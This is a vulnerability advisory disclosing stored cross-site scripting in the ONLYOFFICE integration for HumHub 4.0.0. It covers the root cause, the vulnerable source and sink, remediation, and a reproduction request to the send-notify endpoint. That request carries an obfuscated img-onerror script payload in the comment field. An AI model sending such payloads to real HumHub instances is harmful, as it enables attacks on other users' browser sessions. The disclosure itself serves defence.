# ONLYOFFICE for HumHub notification stored XSS

## Summary

ONLYOFFICE for HumHub 4.0.0 contains stored cross-site scripting in the send-notify notification flow. An authenticated user can supply an attacker-controlled comment and target another user's email address; notification HTML includes the comment preview without output encoding. The payload executes when the target opens the HumHub notification overview. The tested endpoint did not enforce access to the referenced document key.

## Affected product

- Vendor/project: **ONLYOFFICE**
- Product: **ONLYOFFICE integration for HumHub**
- Affected version: **4.0.0**
- Weakness: **CWE-79**
- CVSS 3.1: `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N (5.4)`
- Verification: **STABLE — 3/3 consecutive fresh runs**

## Researcher

- **Zhong Guangyuan, Fudan University**

## Attack prerequisites and impact

Authenticated attacker; valid referenced document key; target opens notification overview.

Verified flow: `send-notify comment → Mention.message → Mention::html() raw concatenation → notification overview`

Successful exploitation permits attacker-controlled markup or script to execute in another user's browser in the affected application origin. The exact privilege and interaction requirements are reflected in the CVSS vector above.

## Reproduction

1. Send a document mention notification containing an HTML marker in the comment field.
2. Confirm the Mention record stores the raw comment preview.
3. Open the target user's notification overview and inspect the notification HTML.

Sanitized request shape used during verification:

```http
# Authenticated attacker; target and document identifiers redacted
POST <BASE_URL>/onlyoffice/api/send-notify
Cookie: <ATTACKER_SESSION_COOKIE>
X-CSRF-Token: <CSRF>
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded

emails[]=<VICTIM_EMAIL>
comment=<img id=gt481023h3c src=x onerror=self["pro"+"mpt"](3)>
ACTION_DATA=anchor-gt481023h3c
doc_key=<VALID_DOCUMENT_KEY>

# Target opens notifications
GET <BASE_URL>/notification/overview
Cookie: <VICTIM_SESSION_COOKIE>
```

Authentication values, private host/IP values, internal identifiers, CSRF values, document keys and one-time tokens are redacted. Parameter names, affected endpoints and payload structure are retained.


## Confirmed source and Sink

```text
ApiController.php:139-151
$message = Yii::$app->request->post('comment');
$mention = Mention::generateMention($file, $message, $anchor);

notifications/Mention.php:24-34
public function html() {
    return Yii::t(...);
        . ' ' . $this->source->message;
}
```

Root cause: The send-notify comment becomes Mention.message. Mention::html() concatenates that stored message into notification HTML without output encoding.

## Recommended remediation

Encode the message as text in Mention::html(), or sanitize to an explicit allowlist before storage and again at the HTML boundary.

## References

- Official source: https://github.com/ONLYOFFICE/onlyoffice-humhub/blob/master/notifications/Mention.php

## Evidence images

These are screenshots of real browser/tool interfaces captured with Google Chrome on macOS. They are not recreated evidence cards:

1. Chrome's native `view-source:` display of the saved trigger response or browser result, with the observed marker selected.
2. Chrome's native `view-source:` display of an independent response, storage record, or browser-verification artifact.
3. The official upstream GitHub source page with GitHub's native line highlighting on the vulnerable Sink.

The first two screenshots reopen saved verification artifacts; they are not described as live requests. Private deployment addresses, credentials, session values, CSRF values, GUIDs and internal record identifiers are redacted. JSON whitespace was normalized for readability, and unrelated application records were omitted where a response contained other test-session data. The payload, affected field, response status and success booleans were retained.

### Trigger response/result in Chrome

![CAN-16 trigger response in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/01-trigger-chrome-v3.png)

### Independent verification in Chrome

![CAN-16 independent verification in Chrome](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/02-verification-chrome-v3.png)

### Official source and Sink on GitHub

![CAN-16 official source Sink](https://raw.githubusercontent.com/TERRENCE-REX/CVE/main/evidence/CAN-16/03-source-github-v3.png)
